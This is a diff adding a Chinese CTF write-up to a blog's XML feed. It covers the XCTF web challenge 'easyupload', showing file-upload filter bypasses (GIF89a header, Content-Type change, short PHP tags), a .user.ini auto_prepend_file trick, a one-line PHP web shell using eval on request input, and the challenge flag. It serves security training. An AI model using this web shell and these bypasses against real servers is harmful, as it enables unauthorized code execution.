@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>攻防世界web-easyupload</title>
+    <link href="/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-easyupload/"/>
+    <url>/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-easyupload/</url>
+    
+    <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h1><p>一名合格的黑客眼中，所有的上传点都是开发者留下的后门</p><p><img src="https://s2.loli.net/2022/08/17/ixpUIAyNQBwCkO2.png" alt="图片.png"></p><p>上传文件后返回文件路径了。</p><p>尝试修改后缀为.php，上传失败。</p><p>新建一个txt文件，内容为：</p><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">GIF89a</span><br>abc.jpg<br></code></pre></td></tr></tbody></table></figure><p>然后文件名改成a.jpg</p><p>上传成功。</p><p><img src="https://s2.loli.net/2022/08/17/Yvi2QP7humpFBAw.png" alt="图片.png"></p><p>（注：我以为是带着jpg的头文件就可以用一句话木马了，结果蚁剑连着的时候数据为空，是我天真了，果断看官方wp）</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>利用文件上传漏洞点，通过绕过服务器的安全防护，达到getshell的目的，主要考察利用fastcgi的.user.ini特性进行任意命令执行</p><p>有关利用.usr.ini构建php后门，博文贴：</p><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><h2 id="绕过的点："><a href="#绕过的点：" class="headerlink" title="绕过的点："></a>绕过的点：</h2><ul><li>检查文件是否有php字符串<ul><li>可以利用段标签绕过，例如<code>&lt;?=phpinfo();?&gt;</code></li></ul></li><li>检查后缀中是否有htaccess或ph<ul><li>可以通过上传.user.ini以及正常jpg文件来进行getshell，在服务器中只要运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini,并作为cgi的启动项。</li><li>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如<code>auto+prepend_file</code></li></ul></li><li>检查文件头部信息<ul><li>绕过方式即在文件头部添加一个图片的文件头，比如<code>GIF89a</code></li></ul></li><li>文件MIME类型<ul><li>绕过方法即修改上传时的Content-Type</li></ul></li></ul><p>新建文件更名为.user.ini，内容为</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=a.jpg<br></code></pre></td></tr></tbody></table></figure><p>上传.user.ini，bp抓包，更改Content-Type为<code>image/jpg</code>,放包，显示上传成功。</p><p><img src="https://s2.loli.net/2022/08/17/eaqHKAEVGvypFcB.png" alt="图片.png"></p><p>新建文件更名为a.jpg，内容为</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">GIF89a<br><span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">'cat /flag);?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>上传成功，蚁剑连接，找到flag:</p><p><img src="https://s2.loli.net/2022/08/17/ovweEJS9kI1NDZG.png" alt="图片.png"></p><p>不知道为什么，官方给的payload上传之后500报错，换了一个payload成功了：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'cmd'</span>]);<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure><p><img src="https://s2.loli.net/2022/08/17/mbTtcXO3wzKF8G6.png" alt="图片.png"></p><pre><code class="hljs">cyberpeace{6ed12a66909f053b9bc1799622c9ce7e}</code></pre>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+      <tag>WEB</tag>
+      
+      <tag>攻防世界</tag>
+      
+      <tag>文件上传漏洞</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>攻防世界web-fileinclude</title>
     <link href="/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileinclude/"/>
     <url>/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileinclude/</url>
